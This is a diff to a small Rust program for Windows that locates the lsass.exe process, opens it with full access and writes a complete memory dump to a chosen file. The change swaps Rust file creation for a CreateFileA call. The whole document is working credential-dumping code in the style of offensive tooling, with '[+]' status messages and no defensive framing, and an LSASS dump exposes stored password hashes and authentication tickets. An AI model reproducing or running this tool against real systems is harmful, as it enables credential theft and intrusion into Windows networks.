@@ -1,10 +1,10 @@
 use std::error::Error;
-use std::fs::File;
-use std::os::windows::io::AsRawHandle;
-use std::path::PathBuf;
+use std::ffi::CString;
 
 use sysinfo::System;
-use windows::Win32::Foundation::*;
+use windows::core::PCSTR;
+use windows::Win32::Foundation::CloseHandle;
+use windows::Win32::Storage::FileSystem::*;
 use windows::Win32::System::Diagnostics::Debug::*;
 use windows::Win32::System::Threading::*;
 
@@ -12,36 +12,40 @@ const LSASS: &str = "lsass.exe";
 
 /// Implement the main logic of the program
 pub fn run(path: &str) -> Result<(), Box<dyn Error>> {
-    // Create output file
+    // Convert output file path to C string
     println!("[*] Trying to dump to output file: {path}");
-    let path = PathBuf::from(path);
-    let output = File::create_new(path)?;
-    println!("[+] Successfully created output file");
+    let path = CString::new(path)?;
 
     // Get LSASS pid
     let pid = lsass_pid()?;
     println!("[+] Found {LSASS} pid: {pid}");
 
-    // Open LSASS process
-    let proc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)? };
-    println!("[+] Successfully opened {LSASS} handle: {proc:?}");
-
-    // Dump lSASS memory to output file and do some cleanup
     unsafe {
-        MiniDumpWriteDump(
-            proc,
-            pid,
-            HANDLE(output.as_raw_handle()),
-            MiniDumpWithFullMemory,
+        // Open LSASS process
+        let proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid)?;
+        println!("[+] Successfully opened {LSASS} handle: {proc:?}");
+
+        // Open output file
+        let output = CreateFileA(
+            PCSTR(path.as_ptr() as *const u8),
+            FILE_GENERIC_WRITE.0,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
             None,
-            None,
+            CREATE_NEW,
+            FILE_ATTRIBUTE_NORMAL,
             None,
         )?;
+        println!("[+] Successfully opened output file handle: {output:?}");
 
+        // Dump lSASS memory to output file
+        MiniDumpWriteDump(proc, pid, output, MiniDumpWithFullMemory, None, None, None)?;
+        println!("[+] Dump successful!");
+
+        // Cleanup
+        CloseHandle(output)?;
         CloseHandle(proc)?;
     }
 
-    println!("[+] Dump successful!");
     Ok(())
 }
 
